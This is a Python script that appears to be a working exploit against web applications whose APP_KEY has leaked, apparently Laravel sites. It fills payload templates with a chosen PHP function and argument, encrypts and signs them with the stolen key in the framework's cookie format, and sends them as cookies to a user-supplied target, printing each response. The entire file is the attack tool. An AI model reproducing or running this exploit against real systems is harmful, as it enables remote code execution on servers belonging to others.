import xmltodict
import base64
from Crypto.Cipher import AES
from Crypto import Random
import json
import hashlib
import hmac
import requests
import urllib
# Ravi Dharmawan - Cyber Security Specialist Pegipegi

HASH_ALGO = hashlib.sha256
SIG_SIZE = HASH_ALGO().digest_size
BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]

def craft_payload(function_name,function_parameter):
    res = []
    len_function_name = len(function_name)
    len_function_parameter = len(function_parameter)
    payload_xml = xmltodict.parse(open("payload.xml","rb").read())
    for payload in payload_xml['root']['payload']:
        payload_ = urllib.unquote(payload)
        payload_ = payload_.replace("LENGTH_FUNCTION_NAME",str(len_function_name))
        payload_ = payload_.replace("[FUNCTION_NAME]",function_name)
        payload_ = payload_.replace("LENGTH_FUNCTION_PARAMETER",str(len_function_parameter))
        payload_ = payload_.replace("[FUNCTION_PARAMETER]",function_parameter)
        res.append(payload_)
    return res

def encrypt_payload(app_key,payload):
    if 'base64' in app_key:
        app_key = base64.b64decode(app_key.split(':')[1])
    msg = pad(payload)
    iv = Random.new().read(16)
    aes_obj = AES.new(app_key,AES.MODE_CBC,iv)
    value = base64.b64encode(aes_obj.encrypt(msg))
    iv = base64.b64encode(iv)
    sig = hmac.new(app_key, iv + value, HASH_ALGO).hexdigest()
    ret = {}
    ret['value'] = value
    ret['iv'] = iv
    ret['mac'] = sig
    ret = json.dumps(ret)
    return base64.b64encode(ret)

def decrypt(iv,cipher,app_key):
    iv = base64.b64decode(iv)
    cipher = base64.b64decode(cipher)
    aes_obj = AES.new(app_key,AES.MODE_CBC,iv)
    return unpad(aes_obj.decrypt(cipher))

def main():
    target = raw_input("Target : ")
    function_name = raw_input("Function Name : ")
    function_parameter = raw_input("Function Parameter : ")
    app_key = raw_input("APP_KEY : ")
    cookie_name = raw_input("Cookie Name : ")


    payload = craft_payload(function_name,function_parameter)
    encrypted_payload = []
    for payload_ in payload:
        tmp = encrypt_payload(app_key,payload_)
        encrypted_payload.append(tmp)

    for payload_ in encrypted_payload:
        cookies = {cookie_name : payload_}
        r = requests.get(target,cookies=cookies,allow_redirects=False)
        print(r.text)
        cont = raw_input("Continue (y/n) ?")
        if cont != "y":
            break

if __name__ == "__main__":
    main()
